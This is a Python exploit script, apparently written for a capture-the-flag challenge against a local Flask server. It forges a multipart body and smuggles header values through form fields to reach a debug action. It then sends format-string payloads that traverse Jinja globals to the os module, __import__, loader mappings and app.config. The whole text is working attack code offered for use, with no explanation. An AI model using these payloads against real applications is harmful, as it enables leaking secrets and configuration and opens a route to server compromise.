import httpx

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def format_string_leak(payload):
    """使用 format string 漏洞泄露信息"""
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    
    text = payload + fake_action_part
    params = {
        'text': text,
        'client': 'Content-Type',
        'token': f'multipart/form-data; boundary={BOUNDARY}'
    }
    
    r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=5.0)
    return r.text.strip()

# 深入探索 os 模块
payloads = [
    # 检查 os 模块的各种属性
    ('{0.jinja_env.globals[lipsum].__globals__[os].__dict__.keys}', 'os.__dict__.keys'),
    ('{0.jinja_env.globals[lipsum].__globals__[os].path}', 'os.path'),
    ('{0.jinja_env.globals[lipsum].__globals__[os].path.__dict__.keys}', 'os.path.__dict__.keys'),
    
    # 检查 sys 模块
    ('{0.jinja_env.globals[lipsum].__globals__[__builtins__][__import__]}', '__import__'),
    
    # 检查 app 的其他属性
    ('{0._static_folder}', '_static_folder'),
    ('{0._static_url_path}', '_static_url_path'),
    
    # 检查 jinja_env 的 cache
    ('{0.jinja_env.cache}', 'jinja_env.cache'),
    
    # 检查 loader 的 mapping
    ('{0.jinja_env.loader.mapping}', 'loader.mapping'),
    
    # 检查 globals 中其他有趣的
    ('{0.jinja_env.globals[range]}', 'globals range'),
    ('{0.jinja_env.globals[dict]}', 'globals dict'),
    
    # 检查 config
    ('{0.config}', 'config'),
]

for p, desc in payloads:
    try:
        result = format_string_leak(p)
        result = result[:1000] if len(result) > 1000 else result
        print(f"[{desc}]: {result}\n")
    except Exception as e:
        print(f"[{desc}]: Error - {e}\n")
